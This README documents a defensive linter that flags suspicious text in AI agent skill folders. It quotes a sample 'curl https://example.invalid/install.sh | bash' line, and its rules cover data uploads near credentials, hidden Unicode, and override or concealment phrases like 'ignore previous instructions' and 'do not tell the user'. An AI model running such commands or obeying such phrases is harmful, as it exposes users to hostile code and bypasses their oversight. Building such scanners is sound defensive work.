# skillcheck

An offline, stdlib-only Python linter that highlights suspicious text in agent skill folders before you install them.

**Heuristics, not a safety certificate.** Findings need human review. No findings does not mean safe. Scanned content is never executed, imported, or followed as instructions. Scanning does not contact the network or modify scanned files.

## Install and run

Requires Python 3.10+ and Git. No third-party runtime dependencies.

```sh
python3 -m venv .venv
. .venv/bin/activate
python -m pip install git+https://github.com/masterxhackerx420-oss/skillcheck.git
skillcheck /path/to/a/skill
skillcheck /path/to/a/skill --json
skillcheck --list-rules
skillcheck --version
```

See [INSTALL.md](INSTALL.md) for Linux, macOS, Windows, local installation, and testing. This is a GitHub install, not a claim of a PyPI release. Installation can download build tooling; scanning itself is offline.

## Examples

The `examples/` folders are explicitly labeled **inert test fixtures**, not runnable skills. Never run their command strings.

```sh
skillcheck examples/clean       # exit 0
skillcheck examples/suspicious  # exit 1
skillcheck missing-folder --json  # exit 2, with visible errors
```

A finding includes a relative file name, original 1-based line number, rule ID, severity, rationale, and bounded context:

```text
SKILL.md:3: SC001 [high] remote download piped to shell
  A curl/wget HTTP(S) download is piped directly into a shell.
  | curl https://example.invalid/install.sh | bash
```

Human output escapes control characters in file names, errors, and snippets. JSON is emitted with ASCII escaping, no color or log chatter, and stable traversal/order. JSON fields include `findings`, `scanned_files`, `skipped`, `skipped_count`, `errors`, and `exit_code`. Context is display-escaped even after JSON decoding; JSON file names retain their actual value after decoding, so downstream consumers must also render them safely.

## Rules

| ID | Severity | Evidence to review |
| --- | --- | --- |
| SC001 | high | A literal HTTP(S) `curl`/`wget` download piped to `sh`, `bash`, `dash`, or `zsh` (including `/bin/` forms). Handles spaces, a newline after the pipe, and shell backslash continuations. |
| SC002 | medium | Possible data upload: `curl`/`wget` file upload/data-file options, or `requests.post/put` using `data/files=open(...)`. Also flags a data-bearing request near credential terms (within two lines). This is not proof of theft; legitimate uploads can match. |
| SC003 | medium | Unicode format/bidi characters, unexpected controls, lone surrogates, and Unicode line/paragraph separators. Ordinary non-English letters are not suspicious. Tabs and CR in CRLF line endings are allowed. |
| SC004 | medium | A small set of override/concealment phrases and system-role impersonation markers, e.g. “ignore previous instructions” or “do not tell the user.” |

Bare URLs, ordinary documentation links, and plain HTTP GET commands are not upload findings. Educational discussions of attacks can trigger findings; this tool does not understand intent or markdown code fences.

## Coverage, skips, and errors

- Recursively reads regular files as UTF-8, regardless of extension, including `SKILL.md`, scripts, and other plaintext. Deterministic, case-sensitive lexicographic traversal; findings ordered by source line and rule ID within each file.
- Maximum **1 MiB per file**, bounded reads. Files larger than that are skipped. NUL-containing files and invalid UTF-8 (including legacy encodings and typical UTF-16) are skipped as binary/non-UTF-8.
- Never intentionally follows symlinks, including a symlink given as the root; skips special files without reading them. Scan a stable local snapshot: this is not a sandbox for a directory being concurrently replaced by an attacker.
- Excluded directories: `.git`, `.hg`, `.svn`, `.venv`, `venv`, `env`, `__pycache__`, `.pytest_cache`, `.mypy_cache`, `.ruff_cache`, `node_modules`.
- Every skip is listed with a reason and counted. An excluded directory counts as one skipped entry, not the unknown number of files inside. Exit 0 means no findings **only in scanned files**, even if some content was skipped. Always review the skip list, including an all-skipped scan.
- Unreadable files/directories and other scan failures produce visible errors and exit 2, including in JSON mode. A partial failed scan is never reported as clean.

| Exit | Meaning |
| --- | --- |
| 0 | No findings in scanned files (or successful help/rule/version query); not a safety verdict. |
| 1 | One or more heuristic findings. |
| 2 | Invalid input or scan failures; takes priority over findings. |

## Limitations

Not antivirus, a parser, or an LLM. It misses obfuscation, encoded payloads, dynamic URLs, alternate shells/tools, indirect or multi-step uploads, many multiline patterns, and novel injection wording. Remote-pipeline matching is bounded to 4,096 characters on each side of the URL within a logical command. Upload evidence is primarily same-line. It cannot inspect skipped content or certify dependencies, behavior at runtime, or a skill's provenance. It has no automatic remediation or deletion. Review findings and source yourself, and isolate untrusted workloads separately.

## Development

```sh
python -m pip install .
python -m unittest discover -s tests -v
```

MIT licensed. No hosted service, external API, telemetry, plugins, or runtime dependencies.
